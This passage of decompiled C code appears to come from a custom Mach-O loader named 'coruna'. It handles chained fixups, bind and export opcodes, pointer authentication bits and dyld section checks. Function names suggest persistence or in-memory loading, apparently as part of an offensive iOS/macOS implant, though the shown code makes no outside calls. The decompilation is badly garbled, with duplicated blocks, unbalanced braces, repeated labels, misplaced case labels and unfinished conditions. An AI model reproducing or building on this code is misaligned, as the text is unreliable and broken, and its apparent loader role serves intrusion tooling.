          }
        }
      }
    }
  }
  return type_id;
}





long coruna_fixup_slide_base(long handle)
{
  long handle;
  int *err;
  int err;
  
  if (handle == 0) {
fail:
    handle = 0;
  }
  else {
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    err = *(int *)(*(long *)(handle + 0x170) + 0x10) + 1;
    do {
      err = err + -1;
      if (err == 0) goto fail;
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        handle = *(long *)(handle + 0x18) + *(long *)(err + 6);
      }
      else {
        handle = 0;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
    } while (handle == 0);
  }
  return handle;
}





unsigned long coruna_fixup_resolve_sym(long arg,uint *val,unsigned long *n,int m)

{
  uint u;
  ushort size;
  unsigned long version;
  unsigned long type_id;
  unsigned long cache_90;
  
  version = 0xad001;
  u = 0x910003;
  if (m == 0) {
    u = 0x910001;
  }
  type_id = (unsigned long)u;
  if (((arg != 0) && (val != (uint *)0x0)) && (n != (unsigned long *)0x0)) {
    if (((~(byte)val[1] & 0xe) == 0) &&
       (size = *(ushort *)((long)val + 6),
       ((byte)val[1] & 0x10) != 0 || (size & 0x80) != 0)) {
      version = *(long *)(arg + 8) + *(long *)(val + 2);
      *n = version;
      if ((size >> 3 & 1) == 0) {
        version = 0;
      }
      else {
        *n = version | 1;
        version = 0;
      }
    }
    else {
      version = type_id;
      if (*(long *)(arg + 0x1b8) != 0) {
        type_id = *(long *)(arg + 0x1b8) + (unsigned long)*val;
        if ((*(unsigned long *)(arg + 8) <= type_id) &&
           (type_id < *(long *)(arg + 0x10) + *(unsigned long *)(arg + 8))) {
          cache_90 = 0;
          type_id = coruna_readclass_from_image(arg,0,type_id,0,0,&cache_90);
          if (((int)type_id != 0x910006) && (version = type_id, (int)type_id == 0)) {
            *n = cache_90;
          }
        }
      }
    }
  }
  return version;
}





uint64_t coruna_macho_apply_chained_fixups(long handle)
{
  unsigned long *ptr;
  byte *ptr;
  long *buf;
  uint *buf;
  uint *str;
  uint *copy;
  uint *data;
  uint *obj;
  long *str;
  uint *block;
  byte err;
  short ls12;
  uint *entry;
  void (*ptr)(void);
  bool status;
  long *copy;
  uint64_t u;
  void *data;
  uint size;
  uint version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint type_id;
  byte *obj;
  uint64_t type_id_8;
  unsigned long type_id_9;
  int err;
  long addr;
  long off;
  void *block;
  unsigned long type_id_10;
  long base;
  int status;
  byte *entry;
  byte *entry_9;
  unsigned long unaff_x30;
  unsigned long scratch;
  uint *bootargs;
  
  type_id_8 = 0xad001;
  if (handle == 0) {
    return 0xad001;
  }
  handle = *(long *)(handle + 0x188);
  if (handle != 0) {
    off = *(long *)(handle + 0x120);
    if (off == 0) {
      return 0xad001;
    }
    addr = *(long *)(handle + 0x40);
    base = *(long *)(handle + 0x168);
    size = *(uint *)(handle + 8);
    type_id = *(uint *)(handle + 0xc);
    copy = (long *)coruna_macho_seg19_offset(handle,0,0);
    if (copy == (long *)0x0) {
      return 0x930004;
    }
    if (type_id == 0) {
fail:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
        ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
        return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
        return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    addr = addr - base;
    entry_9 = (byte *)(off + (unsigned long)size);
    ptr = entry_9 + type_id;
    type_id_9 = 1;
code_r0x00012238:
    entry = entry_9 + 1;
    err = *entry_9 >> 4;
    if (8 < err) {
      return 0x930005;
    }
    port = (unsigned long)*entry_9 & 0xf;
    status = (int)type_id_9;
    err = (int)addr;
    type_id_10 = port;
    entry_9 = entry;
    switch(err) {
    default:
      ptr = coruna_fixup_bind_entry;
      if (*(char *)(handle + 0x138) != '\0') {
      ptr = coruna_fixup_bind_lazy;
      }
      type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
      if ((int)type_id_8 != 0) {
      return type_id_8;
      }
      if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
      return 0;
      }
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
      return type_id_8;
    }
    type_id_9 = type_id_10;
    ptr = coruna_fixup_bind_entry;
    if (*(char *)(handle + 0x138) != '\0') {
    ptr = coruna_fixup_bind_lazy;
    }
    type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
    if ((int)type_id_8 != 0) {
    return type_id_8;
    }
    if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
    return 0;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
    }
    type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
    return type_id_8;
  }
  if (*(long *)(handle + 0x198) == 0) {
    return 0x910010;
  }
  bootargs = (uint *)0x0;
  u = coruna_block_dispose(handle,*(uint32_t *)(*(long *)(handle + 0x198) + 8),&bootargs);
  entry = bootargs;
  if ((int)u != 0) {
    return u;
  }
  block = *(uint **)(handle + 8);
  buf = (uint *)(*(long *)(handle + 0x10) + (long)block);
  if (buf < block) {
    return 0x920006;
  }
  if (bootargs < block) {
    return 0x920006;
  }
  if (buf <= bootargs) {
    return 0x920006;
  }
  size = *(uint *)(*(long *)(handle + 0x198) + 0xc);
  str = (uint *)((unsigned long)size + (long)bootargs);
  if ((str < bootargs || str < block) || buf < str) {
    return 0x920006;
  }
  if (((*bootargs == 0) && (0x1b < bootargs[1])) && (bootargs[1] < size)) {
    type_id = bootargs[4];
    type_id_9 = (unsigned long)type_id;
    if (type_id == 0) {
      if (bootargs[6] != 0) {
        return 0x920003;
      }
      type_id_9 = 0;
      data = (void *)0x0;
joined_r0x00012894:
      bootargs = entry;
      if ((entry != (uint *)0x0) && (size != 0)) {
        buf = (uint *)((long)entry + (unsigned long)entry[1]);
        type_id = *buf;
        if (type_id == 0) {
          type_id_8 = 0;
        }
        else {
          scratch = 0;
          block = (uint *)((long)entry + (unsigned long)size);
          do {
            if (buf[scratch + 1] != 0) {
              type_id_8 = 0x920006;
              if ((block < entry) ||
                 (str = (uint *)((long)buf + (unsigned long)buf[scratch + 1]),
                 (((str < entry || block <= str) || (uint *)0xffffffffffffffe7 < str)
                 || str + 6 < entry) || block < str + 6)) break;
              copy = (uint *)((unsigned long)*str + (long)str);
              if ((copy < str || copy < entry) || block < copy) {
done:
                type_id_8 = 0x920006;
                break;
              }
              port = 0;
              while (port < (ushort)str[5]) {
                copy = (uint *)((long)str + port * 2 + 0x16);
                data = (uint *)((unsigned long)*str + (long)str);
                if (((((data < str || copy < str) || data <= copy) ||
                     (uint *)0xfffffffffffffffc < copy) &&
                     (((data < str || copy < str) || data <= copy) ||
                     copy != (uint *)0xfffffffffffffffd) || (uint *)((long)copy + 2U) < str)
                    type_id_8 = 0x920006;
                    break;
                ls12 = (short)*copy;
                if (ls12 == -1) {
                  type_id_8 = 0;
                }
                else if (ls12 < 0) {
                  obj = (uint *)((long)str + ((long)ls12 & 0x7fffU) * 2 + 0x16);
                  copy = (uint *)((long)obj + 2);
                  if ((((obj < str || data <= obj) || (uint *)0xfffffffffffffffd < obj
                       type_id_8 = 0x920006;
                       break;
                  while( true ) {
                    size = *obj;
                    type_id_8 = coruna_bind_interpret(handle,data,(uint)type_id_9 & 0xffff,str,port,
                                          (ushort)size & 0x7fff);
                    if (((int)type_id_8 != 0) || ((short)(ushort)size < 0)) break;
                    data = (uint *)((unsigned long)*str + (long)str);
                    type_id_8 = 0x920006;
                    break;
                  }
                }
                else {
                  type_id_8 = coruna_bind_interpret(handle,data,(uint)type_id_9 & 0xffff,str,port,ls12);
                }
                port = port + 1;
                if (data == (void *)0x0) {
                return type_id_8;
                }
                if ((type_id_9 & 0xffff) == 0) {
                return type_id_8;
                }
                type_id_9 = type_id_9 & 0xffff;
                u = type_id_8;
                }
                else {
                if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
                u = 0x920003;
                }
                return u;
                code_r0x00012588:
                type_id_9 = type_id_10;
                ptr = coruna_fixup_bind_entry;
                if (*(char *)(handle + 0x138) != '\0') {
                ptr = coruna_fixup_bind_lazy;
                }
                type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
                if ((int)type_id_8 != 0) {
                return type_id_8;
              }
              type_id = *buf;
            }
            type_id_8 = 0;
            scratch = scratch + 1;
          } while (scratch < type_id);
        }
      }
cleanup:
      if (data == (void *)0x0) {
        return type_id_8;
      }
      if ((type_id_9 & 0xffff) == 0) {
        return type_id_8;
      }
      type_id_9 = type_id_9 & 0xffff;
      u = type_id_8;
    }
    else {
      if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
         u = 0x920003;
         }
         return u;
         code_r0x00012588:
         type_id_9 = type_id_10;
         ptr = coruna_fixup_bind_entry;
         if (*(char *)(handle + 0x138) != '\0') {
         ptr = coruna_fixup_bind_lazy;
         }
         type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
         if ((int)type_id_8 != 0) {
         return type_id_8;
    }
skip:
    _bzero(data,type_id_9 << 3);
    _free(data);
  }
  else {
check_ok:
    u = 0x920003;
  }
  return u;
code_r0x00012588:
  type_id_9 = type_id_10;
  ptr = coruna_fixup_bind_entry;
  if (*(char *)(handle + 0x138) != '\0') {
  ptr = coruna_fixup_bind_lazy;
  }
  type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
  if ((int)type_id_8 != 0) {
  return type_id_8;
  }
  if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
  return 0;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
  ___stack_chk_fail();
  }
  type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
  return type_id_8;
}





uint64_t coruna_fixup_bind_lazy(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(addr_2 + 8) != 0)) {
    u = coruna_fixup_bind_entry();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_fixup_bind_entry(long handle,uint64_t *val)
{
  int *err;
  int *status;
  char err;
  uint64_t u;
  int *flags;
  int *count;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (val[1] != 0)) &&
     (u = coruna_readclass_from_image(handle,*(uint32_t *)((long)val + 0x24),val[1],val[3],
                           *(byte *)(val + 2) & 1,&scratch), (int)u == 0)) {
    count = (int *)*val;
    status = *(int **)(handle + 0x40);
    err = (int *)(*(long *)(handle + 0x48) + (long)status);
    if (((((*(ushort *)(handle + 0x1c0) >> 7 & 1) == 0) ||
         (flags = (int *)val[5], flags == (int *)0x0)) ||
        ((*(uint *)(val + 6) == 0 ||
         ((flags + (unsigned long)*(uint *)(val + 6) * 2 < flags || (count < flags)))))) ||
       (flags + (unsigned long)*(uint *)(val + 6) * 2 <= count)) {
      if ((err < status || count < status) || err <= count) {
        return 0x910007;
      }
    }
    else {
      u = coruna_persist_via_dladdr(handle,&scratch);
      if ((int)u != 0) {
        return u;
      }
    }
    err = *(char *)(val + 4);
    if (err == '\x03') {
      u = 0;
      *count = ((int)scratch - (int)count) + -4;
    }
    else if (err == '\x02') {
      u = 0;
      *count = (int)scratch;
    }
    else if (err == '\x01') {
      u = 0;
      *(uint64_t *)count = scratch;
    }
    else {
      u = 0x91000e;
    }
  }
  return u;
}





uint64_t coruna_fixup_run_bindings(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x14) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x10),&scratch);
      if ((int)u == 0) {
        u = coruna_persist_via_u64_pack(handle,0,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x14),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_fixup_run_exports(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x24) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x20),&scratch);
      if ((int)u == 0) {
        u = coruna_persist_via_u64_pack(handle,1,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x24),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_persist_via_fixup_run_bindings(long handle,long addr_2,uint64_t val)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if (*(long *)(handle + 0x188) == 0) {
      u = 0;
    }
    else {
      u = coruna_fixup_run_bindings(handle,addr_2);
      if ((int)u == 0) {
        if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
        u = coruna_fixup_run_exports(handle,addr_2,val);
        return u;
      }
    }
  }
  return u;
}





unsigned long coruna_persist_via_u64_pack(long arg,byte val,byte *n,byte *m,void (*p,
                  uint64_t q)

{
  bool status;
  byte flags;
  uint version;
  unsigned long type_id;
  long serial_7;
  uint32_t tag;
  byte *block;
  byte *entry;
  unsigned long type_id_12;
  unsigned long type_id_14;
  int ret;
  unsigned long type_id_9;
  byte count;
  byte *entry_9;
  void *cache_80;
  byte *cache_81;
  uint64_t cache_54;
  unsigned long bootargs;
  uint64_t host_info;
  void *serial_buf;
  unsigned long cache_20;
  
  type_id = 0xad001;
  if ((((arg != 0) && (n != (byte *)0x0)) && (m != (byte *)0x0)) &&
     ((n <= m && (p != (void (*)0x0)))) {
    bootargs = 0;
    cache_54 = 0;
    serial_buf = (void *)0x0;
    cache_81 = (byte *)0x0;
    cache_80 = (void *)0x0;
    host_info = 1;
    cache_20 = (unsigned long)val << 0x20;
    if (n < m) {
      count = 0;
      while( true ) {
        entry_9 = n + 1;
        flags = *n;
        if (0xd < flags >> 4) break;
        type_id_9 = (unsigned long)flags & 0xf;
        ret = (int)type_id_9;
        n = entry_9;
        switch(flags >> 4) {
        default:
          type_id = 0;
          count = val ^ 1 | count;
          break;
        case 1:
          type_id = 0;
          host_info = coruna_u64_pack((ret), ((uint32_t))host_info);
          break;
        case 2:
          type_id = 0;
          type_id_9 = 0;
          block = entry_9;
          do {
            if (m <= block) {
              tag = 0;
              n = entry_9;
              break;
            }
            n = block + 1;
            flags = *block;
            type_id_12 = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
            if (0x3f < (uint)type_id_9) {
              type_id_12 = 0;
            }
            type_id = type_id_12 | type_id;
            tag = (uint32_t)type_id;
            type_id_9 = (unsigned long)((uint)type_id_9 + 7);
            block = n;
          } while ((char)flags < '\0');
          host_info = coruna_u64_pack((tag), ((uint32_t))host_info);
          type_id = 0;
          break;
          case 0xb:
          type_id = (*p)(arg,&cache_80,q);
          cache_80 = (void *)((long)cache_80 + type_id_9 * 8);
        case 3:
          type_id = 0;
          if (ret == 0) {
            host_info = host_info & 0xffffffff;
          }
          else {
            host_info = coruna_u64_pack(((int)(char)flags), ((uint32_t))host_info) | 0xfffffff000000000;
          }
          break;
        case 4:
          block = entry_9;
          do {
            if (block == m) {
              n = entry_9;
              entry_9 = (byte *)0x0;
              break;
            }
            n = block + 1;
            flags = *block;
            block = n;
          } while (flags != 0);
          cache_54 = coruna_u64_pack71((cache_54), ((char))type_id_9);
          version = 0x91000c;
          if (entry_9 != (byte *)0x0) {
            version = 0;
          }
          type_id = (unsigned long)version;
          cache_81 = entry_9;
          break;
        case 5:
          type_id = 0;
          host_info = coruna_u64_pack71((host_info), ((char))type_id_9);
          break;
        case 6:
          bootargs = 0;
          type_id = 0;
          block = entry_9;
          do {
            if (m <= block) {
              bootargs = 0;
              n = entry_9;
              goto code_r0x00013180;
            }
            n = block + 1;
            flags = *block;
            type_id_9 = ((unsigned long)flags & 0x7f) << (type_id & 0x3f);
            if (0x3f < (uint)type_id) {
              type_id_9 = 0;
            }
            bootargs = type_id_9 | bootargs;
            type_id = (unsigned long)((uint)type_id + 7);
            block = n;
          } while ((char)flags < '\0');
          if ((flags & 0x40) != 0) {
            bootargs = 0xffffffffffffffff;
          }
code_r0x00013180:
          type_id = 0;
          break;
        case 7:
          serial_7 = coruna_macho_seg19_offset(arg,type_id_9,0);
          if (serial_7 != 0) {
            type_id = 0;
            type_id_9 = 0;
            block = entry_9;
            do {
              if (m <= block) {
                type_id = 0;
                n = entry_9;
                break;
              }
              n = block + 1;
              flags = *block;
              type_id_12 = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
              if (0x3f < (uint)type_id_9) {
                type_id_12 = 0;
              }
              type_id = type_id_12 | type_id;
              type_id_9 = (unsigned long)((uint)type_id_9 + 7);
              block = n;
            } while ((char)flags < '\0');
            cache_80 = (void *)(type_id + serial_7);
            type_id = 0;
            break;
            case 0xb:
            type_id = (*p)(arg,&cache_80,q);
            cache_80 = (void *)((long)cache_80 + type_id_9 * 8);
          }
          type_id = 0x910009;
          if (serial_buf != (void *)0x0) {
            _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
            _free(serial_buf);
          }
          break;
        case 8:
          type_id = 0;
          type_id_9 = 0;
          block = entry_9;
          do {
            if (m <= block) {
              type_id = 0;
              n = entry_9;
              break;
            }
            n = block + 1;
            flags = *block;
            type_id_12 = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
            if (0x3f < (uint)type_id_9) {
              type_id_12 = 0;
            }
            type_id = type_id_12 | type_id;
            type_id_9 = (unsigned long)((uint)type_id_9 + 7);
            block = n;
          } while ((char)flags < '\0');
          cache_80 = (void *)((long)cache_80 + type_id);
          type_id = 0;
          break;
          case 0xb:
          type_id = (*p)(arg,&cache_80,q);
          cache_80 = (void *)((long)cache_80 + type_id_9 * 8);
        case 9:
          type_id = (*p)(arg,&cache_80,q);
          cache_80 = (void *)((long)cache_80 + 8);
          break;
        case 10:
          type_id = (*p)(arg,&cache_80,q);
          if ((int)type_id != 0) {
            if (serial_buf != (void *)0x0) {
              _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
              _free(serial_buf);
            }
            break;
          }
          type_id = 0;
          type_id_9 = 0;
          block = entry_9;
          do {
            if (m <= block) {
              type_id = 0;
              n = entry_9;
              break;
            }
            n = block + 1;
            flags = *block;
            type_id_12 = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
            if (0x3f < (uint)type_id_9) {
              type_id_12 = 0;
            }
            type_id = type_id_12 | type_id;
            type_id_9 = (unsigned long)((uint)type_id_9 + 7);
            block = n;
          } while ((char)flags < '\0');
          cache_80 = (void *)((long)cache_80 + type_id + 8);
code_r0x00013274:
          type_id = 0;
          break;
        case 0xb:
          type_id = (*p)(arg,&cache_80,q);
          cache_80 = (void *)((long)cache_80 + type_id_9 * 8);
code_r0x000130c0:
          cache_80 = (void *)((long)cache_80 + 8);
          break;
        case 0xc:
          type_id_9 = 0;
          type_id = 0;
          block = entry_9;
          do {
            if (m <= block) {
              type_id_9 = 0;
              entry = entry_9;
              break;
            }
            entry = block + 1;
            flags = *block;
            type_id_12 = ((unsigned long)flags & 0x7f) << (type_id & 0x3f);
            if (0x3f < (uint)type_id) {
              type_id_12 = 0;
            }
            type_id_9 = type_id_12 | type_id_9;
            type_id = (unsigned long)((uint)type_id + 7);
            block = entry;
          } while ((char)flags < '\0');
          type_id_12 = 0;
          type_id = 0;
          entry_9 = entry;
          do {
            if (m <= entry_9) {
              type_id_12 = 0;
              n = entry;
              break;
            }
            n = entry_9 + 1;
            flags = *entry_9;
            type_id_14 = ((unsigned long)flags & 0x7f) << (type_id & 0x3f);
            if (0x3f < (uint)type_id) {
              type_id_14 = 0;
            }
            type_id_12 = type_id_14 | type_id_12;
            type_id = (unsigned long)((uint)type_id + 7);
            entry_9 = n;
          } while ((char)flags < '\0');
          if (0xfffffffe < type_id_9) {
code_r0x00013338:
            type_id = 0x91000f;
            if (serial_buf != (void *)0x0) {
              _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
              _free(serial_buf);
            }
            break;
          }
          if (type_id_9 == 0) {
            type_id = 0;
          }
          else {
            type_id_14 = 1;
            do {
              type_id = (*p)(arg,&cache_80,q);
              cache_80 = (void *)(type_id_12 + 8 + (long)cache_80);
              if ((int)type_id != 0) break;
              status = type_id_14 < type_id_9;
              type_id_14 = (unsigned long)((int)type_id_14 + 1);
            } while (status);
          }
          break;
        case 0xd:
          if (ret == 1) {
            type_id = coruna_return_zero_15594(arg,serial_buf,cache_20 & 0xffff,cache_80,0,8,0);
          }
          else {
            type_id = 0x91000d;
            type_id = 0;
            block = entry_9;
            do {
              if (m <= block) {
                type_id = 0;
                n = entry_9;
                break;
              }
              n = block + 1;
              flags = *block;
              type_id_12 = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
              if (0x3f < (uint)type_id_9) {
                type_id_12 = 0;
              }
              type_id = type_id_12 | type_id;
              type_id_9 = (unsigned long)((uint)type_id_9 + 7);
              block = n;
            } while ((char)flags < '\0');
            if (serial_buf != (void *)0x0) {
              _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
              _free(serial_buf);
              serial_buf = (void *)0x0;
              cache_20 = cache_20 & 0xffffffff00000000;
            }
            if (type_id >> 0x10 != 0) {
              type_id = 0x91000f;
              if (serial_buf != (void *)0x0) {
                _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
                _free(serial_buf);
              }
              break;
            }
            cache_20 = coruna_u64_pack((cache_20), (int)type_id);
            if ((int)type_id != 0) {
              cache_80 = _calloc(type_id,8);
              if (cache_80 == (void *)0x0) {
                return 0xad009;
              }
              type_id = 0;
              serial_buf = cache_80;
            }
          }
        }
        if ((((int)type_id != 0) || ((count & 1) != 0)) || (m <= n)) {
          if (serial_buf != (void *)0x0) {
            _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
            _free(serial_buf);
          }
          break;
        }
      }
load_ok_15:
      type_id = 0x91000d;
load_ok:
      if (serial_buf != (void *)0x0) {
        _bzero(serial_buf,(cache_20 & 0xffffffff) << 3);
        _free(serial_buf);
      }
    }
    else {
      type_id = 0;
    }
  }
  return type_id;
}





uint64_t
uint64_t coruna_return_zero_15594(int64_t arg,int64_t arg,uint64_t val,uint64_t *id_2,int flags,uint size, int count_2)
{
  long handle;
  unsigned long *ptr;
  long addr;
  unsigned long u;
  unsigned long *buf;
  unsigned long size;
  int err;
  uint64_t version;
  unsigned long port;
  uint64_t *str;
  unsigned long tag;
  unsigned long kind;
  unsigned long scratch;
  unsigned long bootargs;
  
  version = 0xad001;
  if (((arg != 0) && (id_2 != (unsigned long *)0x0)) && ((size & 3) == 0)) {
    u = 0xffffff;
    if (count_2 == 0) {
      u = 0xffff;
    }
    while( true ) {
      bootargs = 0;
      buf = *(unsigned long **)(arg + 8);
      ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
      if (((((ptr < buf || id_2 < buf) || ptr <= id_2) ||
           (unsigned long *)0xfffffffffffffff7 < id_2) || id_2 + 1 < buf) || ptr < id_2 + 1)
      break;
      scratch = *id_2;
      if ((long)scratch < 0) {
        if ((scratch >> 0x3e & 1) == 0) {
          err = coruna_block_dispose(arg,&scratch,id_2);
          tag = scratch;
          if (err == 0) {
            tag = *(unsigned long *)(arg + 0x40);
            kind = scratch & 0xffffffff;
            port = kind + tag;
            kind = kind + tag;
            }
            bootargs = kind;
            if ((*(int *)(arg + 0x5c) == 0x100000c) && (*(int *)(arg + 0x60) < 2)) {
            bootargs = port;
            }
            *id_2 = bootargs;
            if ((scratch >> 0x33 & 0x7ff) == 0) {
            return 0;
          }
          addr = (long)id_2 + (*(long *)(arg + 0x40) - *(long *)(arg + 8));
          handle = *(long *)(arg + 0x40) + (scratch & 0xffffffff);
          port = coruna_pac_sig_ext(scratch,addr,handle);
          kind = port;
          if (*(char *)(arg + 0x138) != '\0') {
            bootargs = port;
            str = _calloc(1,0x20);
            if (str == (uint64_t *)0x0) {
              return 0xad009;
            }
            *str = *(uint64_t *)(arg + 0x140);
            str[1] = addr;
            str[2] = tag;
            str[3] = handle;
done:
            *(uint64_t **)(arg + 0x140) = str;
            kind = bootargs;
          }
        }
        else {
          if ((val & 0xffffffff) <= (scratch & u)) {
            return 0x920001;
          }
          tag = *(unsigned long *)(arg + (scratch & u) * 8);
          if (tag == 0) {
            port = 0;
            kind = bootargs;
          }
          else {
            err = coruna_block_dispose(arg,&scratch,id_2);
            size = scratch;
            port = tag;
            kind = tag;
            if (err != 0) {
              handle = (long)id_2 + (*(long *)(arg + 0x40) - *(long *)(arg + 8));
              port = coruna_pac_sig_ext(scratch,handle,tag);
              kind = port;
              if (*(char *)(arg + 0x138) != '\0') {
                bootargs = port;
                str = _calloc(1,0x20);
                if (str == (uint64_t *)0x0) {
                  return 0xad009;
                }
                *str = *(uint64_t *)(arg + 0x140);
                str[1] = handle;
                str[2] = size;
                str[3] = tag;
                *(uint64_t **)(arg + 0x140) = str;
                kind = bootargs;
                }
                }
                else {
                if ((val & 0xffffffff) <= (scratch & u)) {
                return 0x920001;
              }
            }
          }
        }
      }
      else {
        if ((scratch >> 0x3e & 1) == 0) {
          tag = scratch & 0x7ffffffffff | (scratch >> 0x2b) << 0x38;
          if (flags == 0) {
            kind = *(unsigned long *)(arg + 0x50);
          }
          else {
            kind = *(unsigned long *)(arg + 0x40);
          }
        }
        else {
          if ((val & 0xffffffff) <= (scratch & u)) {
            return 0x920001;
          }
          tag = scratch >> 0x20 & 0x7ffff;
          if ((scratch & 0x4000000000000) != 0) {
            tag = scratch >> 0x20 | 0xfffffffffffc0000;
          }
          kind = *(unsigned long *)(arg + (scratch & u) * 8);
        }
fail:
        port = kind + tag;
        kind = kind + tag;
      }
      bootargs = kind;
      if ((*(int *)(arg + 0x5c) == 0x100000c) && (*(int *)(arg + 0x60) < 2)) {
        bootargs = port;
      }
      *id_2 = bootargs;
      if ((scratch >> 0x33 & 0x7ff) == 0) {
        return 0;
      }
      id_2 = (unsigned long *)((long)id_2 + (unsigned long)(((uint)(scratch >> 0x33) & 0x7ff) * size));
    }
    version = 0x920006;
  }
  return version;
}





uint64_t coruna_block_dispose(long handle,unsigned long *arg,long addr_2)
{
  char err;
  uint64_t u;
  unsigned long size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  long action;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint8_t path_buf;
  
  u = 0;
  if (((handle != 0) && (arg != (unsigned long *)0x0)) && (addr_2 != 0)) {
    if (((*(double *)k_persist_dyldversionnumber_slot < 800.0) && (size = *arg, (long)size < 0)
        ) && (((size & 0x6000000000000) == 0x4000000000000 && ((size & 0xffff00000000) != 0)))) {
      serial_buf = &stack_guard;
      stack_guard = 0;
      sa_new = k_persist_rodata_word_1ef78;
      path_buf = 0;
      scratch = k_persist_nsconcretestackblock_slot;
      bootargs = k_persist_rodata_word_1ef80;
      thread_attr = coruna_check_objc_section;
      host_info = &k_persist_rodata_word_207f8;
      action = addr_2;
      block_ctx = handle;
      sa_saved = serial_buf;
      coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      err = *(char *)(sa_saved + 3);
      __Block_object_dispose(&stack_guard,8);
      if (err != '\0') {
        return 0;
      }
    }
    u = 1;
  }
  return u;
}



coruna_svc_regpack_t coruna_pac_sig_ext(unsigned long arg,unsigned long val,uint64_t n)

{
  uint8_t type_id[16];
  
  if ((long)arg < 0) {
    val = val & 0xffffffffffff | (arg >> 0x20) << 0x30;
    switch(arg >> 0x31 & 3) {
    default:
      break;
    case 1:
      break;
    case 2:
      break;
    case 3:
    }
  }
  type_id = val;
  type_id = n;
  return type_id;
}





uint64_t coruna_check_objc_section(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  int err;
  char *ptr;
  uint64_t tag;
  char *buf;
  long handle;
  long addr;
  
  port = *(unsigned long *)(handle + 0x28);
  addr = *(long *)(*(long *)(handle + 0x30) + 0x18);
  size = addr + *(long *)(addr_2 + 0x18);
  u = port + 1;
  version = size + *(long *)(addr_2 + 0x20);
  if ((((((version >= size && port >= size) && port <= version) &&
        ((version < size || port < size) || version != port)) && port != 0xffffffffffffffff) &&
      size <= u) && u <= version) {
    tag = 0xad017;
    err = _strncmp((char *)(addr_2 + 8),"__DATA",6);
    if (err == 0) {
      buf = (char *)(addr_2 + 0x48);
      ptr = buf + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      if (*(char *)(handle + 0x18) == '\0' && buf < ptr) {
        do {
          size = *(long *)(buf + 0x20) + addr;
          version = size + *(long *)(buf + 0x28);
          if (((((version >= size && port >= size) && port <= version) &&
               ((version < size || port < size) || version != port)) && size <= u) &&
              u <= version) {
            err = _strncmp(buf,"__cfstring",0xc);
